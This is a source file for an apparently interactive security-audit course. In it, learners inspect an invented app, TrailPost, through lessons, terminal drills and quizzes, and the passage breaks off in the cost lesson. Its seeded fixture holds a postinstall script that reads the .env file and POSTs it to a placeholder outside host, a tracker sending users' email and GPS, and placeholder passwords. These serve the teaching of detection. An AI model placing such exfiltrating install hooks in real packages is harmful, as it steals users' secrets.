// Camp 12 of 13 (the K card): Hillary Step. The Auditor: judge any project or tool.
// Same shape as camp2.js. Every weather check so far was a small audit; this camp turns
// them into one full method. All projects, people and services are invented, and every
// web address uses the reserved .example domain. The practice terminal can't fake git
// history, so dates come from the seeded CHANGELOG.md (real `git log` is on the cards).

// ─────────────── The audited project: TrailPost (a pretend repo you "cloned") ───────────────
const TP = '/home/climber/trailpost'

const TP_PKG = '{\n  "name": "trailpost",\n  "version": "2.3.0",\n  "license": "MIT",\n  "scripts": {\n    "start": "node src/server.js",\n    "postinstall": "node scripts/setup.js"\n  },\n  "dependencies": {\n    "crossenv": "^1.0.0",\n    "dayjs": "^1.11.13",\n    "express": "^4.18.2",\n    "trail-maps": "^3.0.1",\n    "trail-utils": "*"\n  }\n}\n'

const TP_README = '# TrailPost\n\nShare your climbing trips with your team.\n\n- 100% private: your data never leaves your device\n- 10x faster than other trip apps (see BENCHMARKS.md)\n- Bank-grade security\n- Actively maintained\n- Free forever\n\n## Install\nnpm install\nnpm run start\n'

const TP_SERVER = 'const express = require("express")\nconst app = express()\n\nconst DB_PASSWORD = "hunter2-summit"\nconst mapsKey = "mt_live_8f3k2q9zx"\nconst port = 3000\n\napp.get("/trips", (req, res) => res.json([]))\napp.listen(port)\n'

const MIT_TEXT = 'MIT License\n\nCopyright (c) 2021 TrailPost contributors\n\nPermission is hereby granted, free of charge, to any person obtaining a copy\nof this software and associated documentation files (the "Software"), to deal\nin the Software without restriction, including without limitation the rights\nto use, copy, modify, merge, publish, distribute, sublicense, and/or sell\ncopies of the Software, and to permit persons to whom the Software is\nfurnished to do so, subject to the following conditions:\n\nThe above copyright notice and this permission notice shall be included in all\ncopies or substantial portions of the Software.\n\nTHE SOFTWARE IS PROVIDED "AS IS", WITHOUT WARRANTY OF ANY KIND, EXPRESS OR\nIMPLIED, INCLUDING BUT NOT LIMITED TO THE WARRANTIES OF MERCHANTABILITY,\nFITNESS FOR A PARTICULAR PURPOSE AND NONINFRINGEMENT. IN NO EVENT SHALL THE\nAUTHORS OR COPYRIGHT HOLDERS BE LIABLE FOR ANY CLAIM, DAMAGES OR OTHER\nLIABILITY, WHETHER IN AN ACTION OF CONTRACT, TORT OR OTHERWISE, ARISING FROM,\nOUT OF OR IN CONNECTION WITH THE SOFTWARE OR THE USE OR OTHER DEALINGS IN THE\nSOFTWARE.\n'

const TRAILPOST = {
  [`${TP}/README.md`]: TP_README,
  [`${TP}/package.json`]: TP_PKG,
  [`${TP}/.env`]: 'DB_URL=postgres://admin:hunter2-summit@db.trailpost.example/trips\nMAPTILES_KEY=mt_live_8f3k2q9zx\n',
  [`${TP}/.gitignore`]: 'node_modules\n',
  [`${TP}/CHANGELOG.md`]: '# Changelog\n\n## 2.3.0 (2023-04-02)\n- Add trip photos\n\n## 2.2.0 (2022-11-20)\n- Faster map loading\n\n## 2.1.0 (2022-06-14)\n- Team invites\n',
  [`${TP}/LICENSE`]: MIT_TEXT,
  [`${TP}/PRIVACY.md`]: '# Privacy\n\nWe collect nothing. Your trips stay on your device.\nServer logs are kept for 10 years to improve the service.\n',
  [`${TP}/scripts/setup.js`]: '// "Setup": prepares your environment\nconst fs = require("fs")\nconst env = fs.existsSync(".env") ? fs.readFileSync(".env", "utf8") : ""\nfetch("https://stats.trailpost-cdn.example/collect", { method: "POST", body: env })\nconsole.log("Setup complete!")\n',
  [`${TP}/src/server.js`]: TP_SERVER,
  [`${TP}/src/analytics.js`]: 'const TRACKER = "https://collect.adwhale.example/v2/event"\n\nfunction track(user, event) {\n  fetch(TRACKER, {\n    method: "POST",\n    body: JSON.stringify({ email: user.email, gps: user.lastLocation, event })\n  })\n}\n\nmodule.exports = { track }\n',
  [`${TP}/node_modules/crossenv/package.json`]: '{\n  "name": "crossenv",\n  "version": "1.0.0",\n  "license": "MIT"\n}\n',
  [`${TP}/node_modules/dayjs/package.json`]: '{\n  "name": "dayjs",\n  "version": "1.11.13",\n  "license": "MIT"\n}\n',
  [`${TP}/node_modules/express/package.json`]: '{\n  "name": "express",\n  "version": "4.18.2",\n  "license": "MIT"\n}\n',
  [`${TP}/node_modules/trail-maps/package.json`]: '{\n  "name": "trail-maps",\n  "version": "3.0.1",\n  "license": "AGPL-3.0-only"\n}\n',
  [`${TP}/node_modules/trail-utils/package.json`]: '{\n  "name": "trail-utils",\n  "version": "0.4.0",\n  "license": "UNLICENSED"\n}\n',
}

// A small helper module for the audit-kit build: finds look-alike package names.
const KNOWN_JS = 'const POPULAR = ["express", "cross-env", "lodash", "dayjs", "dotenv", "axios"]\n\n// true if a and b differ by exactly one added, removed or changed character\nfunction oneEditAway(a, b) {\n  if (a === b || Math.abs(a.length - b.length) > 1) return false\n  let i = 0\n  while (i < a.length && a[i] === b[i]) i++\n  if (a.length === b.length) return a.slice(i + 1) === b.slice(i + 1)\n  if (a.length > b.length) return a.slice(i + 1) === b.slice(i)\n  return a.slice(i) === b.slice(i + 1)\n}\n\n// The popular package that `name` imitates, or null.\nfunction lookalike(name) {\n  if (POPULAR.includes(name)) return null\n  for (const real of POPULAR) if (oneEditAway(name, real)) return real\n  return null\n}\n\nmodule.exports = { POPULAR, lookalike }\n'

export const campK = [
  // ───────────────────────────── Trail 1 ─────────────────────────────
  {
    id: 'K-1', type: 'learn', mode: 'phone', xp: 30, mins: 53,
    title: 'The auditor\'s method',
    teaches: ['audit-method', 'claims-evidence', 'halting-problem'],
    idea: [
      { h: 'What an audit is', b: "The Hillary Step is the last rock wall below the summit. Climbers have to decide there whether to go on or turn back.\n\nThis camp teaches the software version of that decision. Since Base Camp, every camp ended with a small **weather check**: a quick look at one suspicious claim. Here you turn those checks into a full **audit**: a method you can point at any codebase, product or tool and come back with a clear, defensible verdict." },
      { h: 'Your audit target for this camp', b: "A friend's climbing club wants to use **TrailPost**, an open-source app for sharing trip plans. Its README promises \"100% private\", \"10× faster\", \"actively maintained\" and \"free forever\". You've cloned the repo. Over the next trails you'll audit it from every side: claims, health, dependencies, threats, secrets, cost, privacy, licences and benchmarks.\n\nRule one of auditing: **read, don't run.** You'll open files and check them, but you won't run anything you haven't read. Next come the Field Guide cards: the method itself, and how to weigh claims against evidence." },
      { h: "Under the hood: why auditors exist at all", b: "In 1936 Alan Turing proved that no program can look at every other program and always tell whether it will finish running. That's the **halting problem**, and it means no tool, however clever, can tell you, for every program, whether it is bug-free or safe. Scanners, linters and AI reviewers all either miss some real problems or flag some fine code.\n\nSo an auditor never treats one tool's \"all clear\" as proof. They gather evidence from several methods (tests, reading the code, scanners, running it) and spend the most care where a failure would hurt the most." },
    ],
    example: {
      intro: 'The first ten minutes of an audit. Tap through each line.',
      lang: 'sh',
      code: '$ cd trailpost\n$ ls -a\n.  ..  CHANGELOG.md  .env  .gitignore  LICENSE  node_modules  package.json  PRIVACY.md  README.md  scripts  src\n$ cat .gitignore\nnode_modules\n$ cat README.md\n# TrailPost\n...\n- 100% private: your data never leaves your device\n$ echo "HIGH: .env (database password) is in the repo" > ~/audit-notes.txt',
      steps: [
        { line: 1, note: 'Step into the cloned project. You\'re going to read it, not run it.' },
        { line: 2, note: '`ls -a`, because the most important files in an audit are often hidden ones (names starting with a dot).' },
        { line: 3, note: 'There it is: `.env`, the file that usually holds passwords and keys. A clone only contains files someone **committed**, so this secret was published with the code.' },
        { line: 4, note: 'Why did that happen? `.gitignore` lists what Git should never commit.' },
        { line: 5, note: 'Only node_modules. `.env` was never ignored. That\'s the cause, written down as evidence.' },
        { line: 6, note: 'Now the claims. The README is the project\'s sales pitch; you copy each claim exactly.' },
        { line: 9, note: '"Data never leaves your device", yet the app has a database password. A claim to test against the code later.' },
        { line: 10, note: 'Evidence goes in a notes file in your **home** folder (`~`), never inside the project you are auditing.' },
      ],
    },
    tryit: {
      kind: 'terminal',
      brief: "Start the TrailPost audit. **Scope:** is TrailPost safe and honest enough to recommend? Read-only.\n1. `cd trailpost`\n2. `ls -a` to see every file, hidden ones too\n3. `cat README.md` to read the claims\n4. `cat .gitignore` to see what was meant to stay out of the repo\n5. `cat .env` to confirm what leaked (look, but never copy the values into a report)\n6. Record the finding in your notes, outside the project:\n`echo \"HIGH: .env with a database password is in the repo\" > ~/audit-notes.txt`\nThen `cat ~/audit-notes.txt` to check it saved.",
      seed: TRAILPOST,
      keys: ['cd ', 'ls -a', 'cat ', 'echo ', 'trailpost', 'README.md', '.gitignore', '.env', ' > ', '~/audit-notes.txt', '"'],
      steps: [
        { kind: 'cwd', path: TP, label: 'You are inside `trailpost`' },
        { kind: 'cmd', re: '^ls -a', label: 'Look at everything with `ls -a`' },
        { kind: 'cmd', re: '^cat README\\.md$', label: 'Read the claims in `README.md`' },
        { kind: 'cmd', re: '^cat \\.gitignore$', label: 'Check `.gitignore`' },
        { kind: 'cmd', re: '^cat \\.env$', label: 'Confirm what\'s in `.env`' },
        { kind: 'file', path: '/home/climber/audit-notes.txt', contains: '.env', label: 'A finding about `.env` is saved in `~/audit-notes.txt`' },
      ],
    },
    mistakes: [
      { wrong: 'npm install   (to "see what TrailPost does")', result: '(runs the postinstall script immediately, with your permissions)', why: 'Installing runs code before you\'ve read it. An audit reads package.json and the scripts first. You\'ll do exactly that next trail.' },
      { wrong: 'echo "HIGH: .env leaked" > audit-notes.txt   (while inside trailpost)', result: '(your notes are now a file inside the project you are auditing)', why: 'You\'ve changed the thing under audit, and a careless `git add .` could commit your notes. Keep notes in `~`.' },
      { wrong: 'Finding: "Security seems weak."', result: '(nobody can check or fix this)', why: 'No evidence, no location, no severity. Write: "HIGH: .env with a database password is committed (.gitignore lists only node_modules)."' },
    ],
    recap: [
      'An **audit** answers one question with a verdict: **scope → questions → evidence → verdict**.',
      'Write the scope first: the question, what\'s in, what\'s out, a time box, and **read-only**.',
      'Every finding needs **evidence** someone else can re-check: file, line, command, output, exact quote.',
      'A **claim** is what they say; **evidence** is what you can check. Mark claims SUPPORTED, CONTRADICTED or UNVERIFIED.',
      'Keep notes outside the project, and never run what you haven\'t read.',
      "The **halting problem** proves no tool can judge every program correctly, so a tool's \"all clear\" is evidence, never proof.",
    ],
    questions: [
      { concept: 'audit-method', kind: 'mc', q: 'Greta is asked whether the food bank should adopt StockShelf, an open-source inventory app. Before opening a single file, what should go on paper first?', options: ['A first verdict, so the evidence gathered has a clear direction', 'The question, what\'s in and out of scope, a time box, read-only', 'A list of the bugs Greta expects, to tick each one off', 'Nothing yet: a scope is easier to write after an hour of exploring'], answer: 1, why: 'The scope comes first: it says what matters and when to stop. A verdict written first bends the evidence toward it, and exploring with no question collects random notes.' },
      { concept: 'audit-method', kind: 'mc', q: 'Hassan is auditing a dog-walking booker. Which of these notes could another auditor re-check exactly?', options: ['The prep script is probably malicious, judging by its vague name', 'package.json line 9 runs tools/prep.js as a postinstall script', 'A developer I trust says this repo has been unsafe for years', 'The code looks rushed in places, which usually hides bugs'], answer: 1, why: 'A file, a line and what it says can be opened and checked by anyone. A guess from a name, hearsay and a feeling can\'t be re-checked.' },
      { concept: 'audit-method', kind: 'mc', q: 'The carpool planner\'s live servers are out of scope: you have no permission to test them. You notice its login page looks weak. What do you do?', options: ['Try a few common passwords, since a handful of attempts does no harm', 'Leave it alone, and say in the report that the live site wasn\'t tested', 'Ask the maintainers, and test it yourself if they don\'t reply in a day', 'Mark the login as secure, since nothing in the code hints at a flaw'], answer: 1, why: 'Testing a system without permission can be illegal, however gentle the test. Saying what you didn\'t check is honest; a guess either way would mislead the reader.' },
      { concept: 'claims-evidence', kind: 'mc', q: 'A habit tracker\'s README says "Actively maintained". Its newest commit and newest CHANGELOG entry are both three years old, though it gained 40 stars last week. How do you mark the claim?', options: ['Supported', 'Contradicted', 'Unverified', 'Irrelevant'], answer: 1, why: 'Three years with no commit or release is evidence of the opposite. Stars are bookmarks: they show attention, not anyone fixing anything.' },
      { concept: 'claims-evidence', kind: 'mc', q: 'A tip calculator\'s README says "Free forever". You find no pricing page and no terms anywhere. How do you mark it?', options: ['Contradicted: with no terms, assume it will cost money later', 'Supported: it costs nothing today, so the claim holds', 'Unverified: no evidence either way', 'Supported: a README line is the project\'s own promise'], answer: 2, why: 'No proof isn\'t proof of the opposite. Free today says nothing about forever, so "unverified" is accurate and fair.' },
      { concept: 'claims-evidence', kind: 'mc', q: 'A plant shop catalogue claims it "loads 10× faster than rival shop apps". Who has to prove that?', options: ['You, the auditor, by testing until you can show it\'s false', 'The project that makes the claim', 'The rival shop apps, since they\'re the ones compared', 'Nobody: a speed line in a README is opinion, not fact'], answer: 1, why: 'The burden of proof is on whoever makes the claim. Until they show it, the claim is unverified.' },
      { concept: 'claims-evidence', kind: 'mc', q: 'Which line from a sports scoreboard\'s README promises the least, even though it sounds the strongest?', options: ['"Median update time 230 ms, using the script in BENCH.md"', '"Up to 10× faster score updates than other apps"', '"p95 update time 410 ms, measured on a 2021 phone"', '"Scores appear within 1 s in 99% of the games we timed"'], answer: 1, why: '"Up to" is satisfied by one best-case result. The others name a measure and a number someone can check.' },
      { concept: 'audit-method', kind: 'mc', q: 'You clone a kids\' reading log repo, and `ls -a` shows a `.env` file. What does that tell you?', options: ['Git generated it during the clone, as a template for your settings', 'Someone committed it: a clone only holds committed files, so it\'s public', 'Nothing alarming: .env is local config and is always safe to ship', 'It\'s private: dotfiles are hidden from visitors browsing the repo'], answer: 1, why: 'A clone only contains what was committed, so the file was published. A dot hides a file from plain `ls`, not from the internet.' },
      { concept: 'halting-problem', kind: 'mc', q: 'A scanner vendor promises: "Our AI proves any program is bug-free." What does the halting problem say about that promise?', options: ['It could be true with enough computing power and training data', 'No tool can decide that for every program, so it\'s an overclaim', 'It holds as long as every program it checks comes with full tests', 'It\'s only impossible for programs that contain an infinite loop'], answer: 1, why: 'Turing proved no program can even decide "will this finish?" for every program. Deciding "bug-free" for every program is at least as hard, so a guarantee is an overclaim.' },
    ],
  },

  // ───────────────────────────── Trail 2 ─────────────────────────────
  {
    id: 'K-2', type: 'learn', mode: 'phone', xp: 30, mins: 50,
    title: 'Repo health and dependencies',
    teaches: ['repo-health', 'dependency-audit'],
    idea: [
      { h: 'Is the project still maintained?', b: "**Repo health** tells you whether anyone is still maintaining a project and will fix the next problem, whatever its README claims.\n\nMost of a Node app's code comes from **dependencies** (packages written by other people), so auditing them covers much of the real risk." },
      { h: 'What you will check', b: "Two cards: **Repo health** (dates, issues, the bus factor) and **Dependency audit** (install scripts, look-alike names, version ranges, and `npm audit` on real computers).\n\nThen you'll go back into TrailPost and check the three things that run or arrive without asking: the changelog dates, the scripts npm would run, and the code behind the postinstall script." },
    ],
    example: {
      intro: 'Checking health and dependencies without installing anything. Tap through it.',
      lang: 'sh',
      code: '$ head -n 4 CHANGELOG.md\n# Changelog\n\n## 2.3.0 (2023-04-02)\n- Add trip photos\n$ npm run\nLifecycle scripts included in trailpost@2.3.0:\n  start\n    node src/server.js\n  postinstall\n    node scripts/setup.js\n$ cat scripts/setup.js\nconst env = fs.existsSync(".env") ? fs.readFileSync(".env", "utf8") : ""\nfetch("https://stats.trailpost-cdn.example/collect", { method: "POST", body: env })',
      steps: [
        { line: 1, note: '`head -n 4` shows only the newest entries. The changelog is the release history.' },
        { line: 4, note: 'Last release: April 2023. Compare that with "Actively maintained" in the README.' },
        { line: 6, note: '`npm run` with no script name lists the scripts, and runs nothing. Safe.' },
        { line: 10, note: '`postinstall` is a special name: npm runs it automatically after every `npm install`.' },
        { line: 11, note: 'So `node scripts/setup.js` would run on your machine the moment you install. Read it.' },
        { line: 12, note: 'Read the script instead of running it. (Lines trimmed here.)' },
        { line: 13, note: 'It reads your `.env` file: your secrets.' },
        { line: 14, note: 'And sends them to an outside server. That\'s a HIGH finding, found without running a single line.' },
      ],
    },
    tryit: {
      kind: 'terminal',
      brief: "Check TrailPost's health and its dependencies, still read-only:\n1. `cd trailpost`\n2. `head -n 5 CHANGELOG.md` for the newest release date\n3. `npm run` lists the scripts (it runs nothing without a name)\n4. `cat scripts/setup.js` to read what postinstall would run\n5. `cat package.json` and look at the dependency names and versions: any look-alikes, any `*`?\n6. Add a finding to your notes:\n`echo \"HIGH: postinstall uploads .env to an outside server\" >> ~/audit-notes.txt`\n\n⚠️ Don't run `npm install` or `npm run postinstall`. Reading is the audit.",
      seed: TRAILPOST,
      keys: ['cd ', 'head -n 5 ', 'npm run', 'cat ', 'echo ', 'trailpost', 'CHANGELOG.md', 'scripts/setup.js', 'package.json', ' >> ', '~/audit-notes.txt', '"'],
      steps: [
        { kind: 'cwd', path: TP, label: 'You are inside `trailpost`' },
        { kind: 'cmd', re: '^head .*CHANGELOG\\.md$', label: 'Check the newest release with `head`' },
        { kind: 'cmd', re: '^npm run$', label: 'List the scripts with `npm run`' },
        { kind: 'cmd', re: '^cat scripts/setup\\.js$', label: 'Read what postinstall would run' },
        { kind: 'cmd', re: '^cat package\\.json$', label: 'Read the dependencies in `package.json`' },
        { kind: 'file', path: '/home/climber/audit-notes.txt', contains: 'postinstall', label: 'A postinstall finding is saved in `~/audit-notes.txt`' },
      ],
    },
    mistakes: [
      { wrong: 'npm run postinstall   (to see what it does)', result: '(your .env would be sent to the outside server)', why: 'Running it IS the attack. You read `scripts/setup.js` instead, and the code told you everything.' },
      { wrong: '"Express has 60,000 stars, so TrailPost\'s dependencies are fine."', result: '(crossenv and trail-utils were never checked)', why: 'Every dependency gets checked on its own. The famous one being fine says nothing about the look-alike next to it.' },
      { wrong: 'npm audit   →   found 0 vulnerabilities   →   "safe!"', result: '(the crossenv typosquat isn\'t in any database yet)', why: '`npm audit` only knows reported problems. Names, install scripts and health still need your eyes.' },
    ],
    recap: [
      '**Repo health**: last commit and release, issues answered, contributors (the **bus factor**), tests, licence. Stars are weak evidence.',
      'Install scripts (`preinstall`, `install`, `postinstall`) run automatically on `npm install`. Read them first.',
      'Check every dependency name letter by letter, and flag `"*"`, `"latest"` and git-URL versions.',
      'On real computers: `npm audit` for known holes (`--omit=dev` for what ships) and `npm outdated` for freshness.',
      '"0 vulnerabilities" means none **known**, not none.',
    ],
    questions: [
      { concept: 'repo-health', kind: 'mc', q: '`git shortlog -sn HEAD` on a library your budgeting app depends on prints `412  Mirela` and then `6  Taiwo`. What is the main risk?', options: ['Quality: code from one main author is always buggier than team code', 'Bus factor 1: if Mirela stops, fixes almost certainly stop too', 'Abandonment: one main author shows everyone else has already left', 'Licensing: code written mostly by one person can\'t be reused freely'], answer: 1, why: 'The bus factor is how many people must vanish before a project stalls. One person wrote nearly everything, so it is about 1. That alone says nothing about quality or licence.' },
      { concept: 'repo-health', kind: 'mc', q: 'Which is the WEAKEST sign that a library is still looked after?', options: ['The last release came out three weeks ago', 'Maintainers replied to new issues this week', 'The repo page shows 20,000 stars', 'Four people merged changes this month'], answer: 2, why: 'Stars are bookmarks: they never expire and can be bought, so a dead project keeps them. The others show people working on it now.' },
      { concept: 'repo-health', kind: 'mc', q: 'A tiny library that pads text has had no commits for 3 years and has no open bugs. Fair verdict?', options: ['Dead: three years without a commit means abandoned, so never use it', 'Possibly fine: small finished code may have nothing left to fix', 'Suspicious: a quiet repo with no open bugs must be deleting issues', 'Health doesn\'t matter for tiny code, since small code has no risk'], answer: 1, why: 'Context matters. Quiet is a warning for big, internet-facing code, much less so for a tiny, finished utility.' },
      { concept: 'dependency-audit', kind: 'mc', q: 'A choir rota app\'s package.json defines `preinstall`, `test`, `build` and `start`. Which runs by itself when someone types `npm install`?', options: ['build', 'preinstall', 'test, then start', 'all four, in file order'], answer: 1, why: '`preinstall`, `install` and `postinstall` are lifecycle scripts that npm runs on its own. The others only run when you ask for them by name.' },
      { concept: 'dependency-audit', kind: 'mc', q: 'Project A lists `"csv-lite": "*"` with no lock file. Project B lists `"csv-lite": "^2.1.0"` and commits its lock file. A broken 3.0.0 is published tonight. What happens on a fresh install tomorrow?', options: ['Both get 3.0.0, since npm always installs the newest version', 'A gets 3.0.0; B stays on the exact 2.x version in its lock file', 'B gets 3.0.0, since ^ means "this version or anything newer"', 'Neither gets it, since npm holds every new version back for a week'], answer: 1, why: '`*` accepts any version, so A takes whatever is newest. `^2.1.0` never allows 3.x, and B\'s lock file pins the exact version that was reviewed.' },
      { concept: 'dependency-audit', kind: 'mc', q: '`npm audit` on a bakery order form reports one HIGH problem, in a test runner listed under devDependencies. What is the sensible first step?', options: ['Run `npm audit fix --force` now, since a HIGH result must go first', 'Check what ships with `npm audit --omit=dev`, note it, plan an update', 'Stop all work until the test runner is removed from the project', 'Ignore it: devDependencies can never be a risk, so this is noise'], answer: 1, why: 'Severity is the starting point. Where the problem sits (a dev tool or code that ships) decides how urgent it is, and --force can break things.' },
      { concept: 'dependency-audit', kind: 'mc', q: 'Why be careful with `npm audit fix --force`?', options: ['It deletes the lock file, which erases your own code changes', 'It may jump a MAJOR version, which can break your app', 'It uploads your dependency list, leaking private names', 'It removes every vulnerable package, leaving gaps in your app'], answer: 1, why: 'Plain `npm audit fix` stays inside your allowed ranges. `--force` may install a new major version with breaking changes.' },
      { concept: 'dependency-audit', kind: 'mc', q: 'A library-swap app\'s package.json lists `loadsh`. The popular package is `lodash`. What goes in your notes?', options: ['Harmless: a spelling variant published by the lodash authors', 'Possible typosquat: a look-alike name, HIGH until proven otherwise', 'A newer fork of lodash, so it\'s probably safer and better kept', 'LOW: npm blocks misspelled names before anyone can install them'], answer: 1, why: 'Swapped or extra letters on a popular name is the typosquatting pattern. Treat it as hostile until you have checked who published it.' },
    ],
  },

  // ───────────────────────────── Trail 3 ─────────────────────────────
  {
    id: 'K-3', type: 'learn', mode: 'phone', xp: 35, mins: 55,
    title: 'Architecture, threats and secrets',
    teaches: ['architecture-review', 'threat-model', 'secret-scan'],
    idea: [
      { h: 'Map the system, then list the dangers', b: "An **architecture review** maps the parts of a system and the data flowing between them. A **threat model** asks what's valuable, who might attack it, and where they could get in.\n\nA **secret scan** looks for passwords and keys left in the code, because those let an attacker in directly." },
      { h: 'Build a secret scanner', b: "Three cards, then you'll write a tiny **secret scanner** in JavaScript using a **regular expression** (a text pattern). The Secret scan card teaches the four regex pieces you need. Real tools work the same way, just with hundreds of patterns." },
    ],
    example: {
      intro: 'A secret scanner in a few lines. Tap through it.',
      lang: 'js',
      code: 'const SECRET = /(password|secret|key|token)\\w*\\s*=\\s*["\']/i\n\nconst code = \'const port = 3000\\nconst DB_PASSWORD = "hunter2-summit"\\nconst appName = "TrailPost"\'\nconst lines = code.split("\\n")\n\nlines.forEach((line, i) => {\n  if (SECRET.test(line)) console.log("Possible secret on line " + (i + 1))\n})',
      steps: [
        { line: 1, note: 'The pattern: a secret-ish word (`password|secret|key|token`), maybe more name letters (`\\w*`), maybe spaces (`\\s*`), `=`, maybe spaces, then a quote (`["\']`). The `i` ignores case.' },
        { line: 3, note: 'Some pretend source code: three lines in one string, joined by `\\n` (new line).' },
        { line: 4, note: 'Split it into an array of lines, so each can be checked on its own.' },
        { line: 6, note: '`forEach` gives each line and its index `i`. Indexes start at 0.' },
        { line: 7, note: '`SECRET.test(line)` is true only for line 2. Line numbers start at 1, so print `i + 1`. Output: `Possible secret on line 2`.' },
      ],
    },
    tryit: {
      kind: 'code',
      prompt: "The sandbox has TrailPost's `src/config.js`. Finish the scanner:\n1. `isSecretLine(line)` returns `true` if the line matches `SECRET`\n2. Loop over the lines and print `Possible secret on line N` for each match (lines count from 1)\n3. Finish with `3 possible secrets found` (the real count)\n\nExpected output:\n`Possible secret on line 3`\n`Possible secret on line 4`\n`Possible secret on line 6`\n`3 possible secrets found`\n\nNever print the secret itself: line numbers only.",
      starter: 'const fs = require("fs")\nconst SECRET = /(password|secret|key|token)\\w*\\s*=\\s*["\']/i\n\nfunction isSecretLine(line) {\n  // return true if the line matches SECRET (hint: SECRET.test(line))\n}\n\nconst lines = fs.readFileSync("src/config.js", "utf8").split("\\n")\nlet found = 0\n// loop over lines with forEach((line, i) => ...)\n// print "Possible secret on line N" for each match, and count it\n\n// print "<found> possible secrets found"\n',
      files: { 'src/config.js': '// TrailPost settings\nconst port = 3000\nconst DB_PASSWORD = "hunter2-summit"\nconst mapsKey = "mt_live_8f3k2q9zx"\nconst appName = "TrailPost"\nconst sessionSecret = \'change-me\'\nmodule.exports = { port, appName }\n' },
      expect: ['Possible secret on line 3', 'Possible secret on line 4', 'Possible secret on line 6', '3 possible secrets found'],
      checks: [
        { expr: 'isSecretLine(\'const apiToken = "abc"\')', equals: true, label: 'isSecretLine spots a token' },
        { expr: 'isSecretLine("const tokens = 5")', equals: false, label: 'isSecretLine ignores a number' },
      ],
      hints: ['Step 1 is one line: `return SECRET.test(line)`.', 'The loop: `lines.forEach((line, i) => { if (isSecretLine(line)) { console.log("Possible secret on line " + (i + 1)); found++ } })`.', 'Last line: `console.log(found + " possible secrets found")`.'],
    },
    mistakes: [
      { wrong: 'console.log("Possible secret on line " + i)', result: 'Possible secret on line 2', why: 'Array indexes start at 0, line numbers at 1. Print `i + 1`, or the report points at the wrong line.' },
      { wrong: 'const SECRET = /password|secret|key|token\\w*\\s*=\\s*["\']/i', result: '(matches the word "secret" anywhere, even in comments)', why: 'Without brackets, `|` splits the WHOLE pattern into alternatives. Group the words: `(password|secret|key|token)`.' },
      { wrong: 'console.log("Found: " + line)', result: 'Found: const DB_PASSWORD = "hunter2-summit"', why: 'You just leaked the secret again, into your output. Report the file and line, not the value.' },
    ],
    recap: [
      '**Architecture review**: boxes (parts) and arrows (data flows). Ask about single points of failure, where secrets live, third parties and backups.',
      'Anything shipped to a browser or phone is public. Secrets stay on the server.',
      '**Threat model**: assets → attackers → entry points → what could go wrong (STRIDE) → mitigation.',
      'STRIDE = Spoofing, Tampering, Repudiation, Information disclosure, Denial of service, Elevation of privilege.',
      '**Secret scan**: test each line against a pattern, report file + line, never the value. Leaked? **Rotate** the key first.',
    ],
    questions: [
      { concept: 'architecture-review', kind: 'mc', q: 'A weather widget\'s front-end bundle contains `const WX_KEY = "wx_live_4hd9..."`. The repo is private. What is the finding?', options: ['Fine: the repo is private, so only the team can ever reach the code', 'The key is public: anyone can read browser code. Call from a server', 'Fine: minified code is scrambled, so nobody can read the key out', 'Only a problem on phones, since desktop browsers hide script files'], answer: 1, why: 'Whatever the browser downloads, users can read in devtools, however private the repo or minified the code. Secrets stay on the server.' },
      { concept: 'architecture-review', kind: 'mc', q: 'You want a quick list of every outside service a school lunch menu app talks to, before reading any code. Which file is the best first stop?', options: ['CHANGELOG.md', '.env.example', 'LICENSE', '.gitignore'], answer: 1, why: 'Each outside service needs a key, so the example env file names them all, usually with empty values.' },
      { concept: 'threat-model', kind: 'mc', q: 'Delfina says: "Nobody would bother attacking our chess club ladder." Why is that wrong?', options: ['It\'s right: attackers pick targets with money, and a ladder has none', 'Most attacks are bots that scan every public address, whatever its size', 'Small sites lack firewalls, so people pick them off by hand, one at a time', 'It\'s right unless the site takes card payments, which a ladder doesn\'t'], answer: 1, why: 'Bots scan every public address and repo, all day, without caring who owns it.' },
      { concept: 'threat-model', kind: 'mc', q: 'Anyone can call `PUT /scores/:id` on a sports scoreboard, with no login, and change a final score. Which STRIDE letter fits best?', options: ['S: Spoofing', 'T: Tampering', 'R: Repudiation', 'I: Information disclosure'], answer: 1, why: 'Changing data you shouldn\'t be able to change is tampering. Nobody pretended to be someone else, and nothing was leaked.' },
      { concept: 'threat-model', kind: 'mc', q: 'A forum\'s `/admin` page needs no login, so any visitor can use its controls to make themselves a moderator. Which STRIDE letter fits best?', options: ['I: Information disclosure', 'E: Elevation of privilege', 'R: Repudiation', 'S: Spoofing'], answer: 1, why: 'A visitor gains powers they should never have: elevation of privilege.' },
      { concept: 'threat-model', kind: 'mc', q: 'What must every item in a threat model end with?', options: ['A likelihood estimate: how often the attack is expected to happen', 'A mitigation: the fix or the defence you\'ll put in place', 'The affected file and line, so a developer can find it', 'A named owner who answers for that attack surface'], answer: 1, why: 'Without mitigations, a threat model is just a worry list.' },
      { concept: 'secret-scan', kind: 'mc', q: 'The scanner below checks four lines. What number does the last line log?', code: 'const SECRET = /(password|secret|key|token)\\w*\\s*=\\s*["\']/i\nconst lines = [\'const apiKey = "abc123"\', \'const keys = 4\', "const TOKEN_TTL = \'1h\'", \'let password = input\']\nconsole.log(lines.filter(l => SECRET.test(l)).length)', options: ['2', '1', '3', '4'], answer: 0, why: '`apiKey = "abc123"` and `TOKEN_TTL = \'1h\'` have a secret-looking name, an `=`, then a quote. `keys = 4` and `password = input` have the word but no quote after the `=`.' },
      { concept: 'secret-scan', kind: 'mc', q: 'Eamon committed `.env`, then deleted it in the next commit. Is the leak fixed?', options: ['Yes: deleting a file in Git removes it from earlier commits too', 'No: the old commit still holds it, and it may be copied. Rotate first', 'Yes, once .env is in .gitignore, since Git then erases stored copies', 'Yes, as long as nobody noticed it in the first hour after it was pushed'], answer: 1, why: 'Git keeps every version, and bots copy leaked keys fast. Revoke and replace the secret first, then clean up.' },
    ],
  },

  // ───────────────────────────── Trail 4 ─────────────────────────────
  {
    id: 'K-4', type: 'learn', mode: 'phone', xp: 30, mins: 45,
    title: 'Working out the real cost',
    teaches: ['cost-analysis'],
    idea: [
      { h: 'Free tiers have limits', b: "Many tools are free to start. But \"free\" usually means \"free up to a limit\". Past the limit, every extra unit is billed: requests, storage, and especially data sent out to users.\n\nAn auditor turns a pricing page into a number for **your** usage, then asks what the bill would be with 10× the users." },
      { h: 'The pricing used in this camp', b: "TrailPost's hosting runs on **CloudCairn** (an invented service). Its pricing:\n• **requests**: first 1,000,000 per month free, then $0.40 per million\n• **storage**: first 5 GB free, then $0.02 per GB\n• **data out**: first 100 GB free, then $0.09 per GB\n\nRead the Cost analysis card, then you'll compute the bill in code." },
    ],
    example: {
      intro: 'One unit of the bill, worked through. Tap each line.',
      lang: 'js',
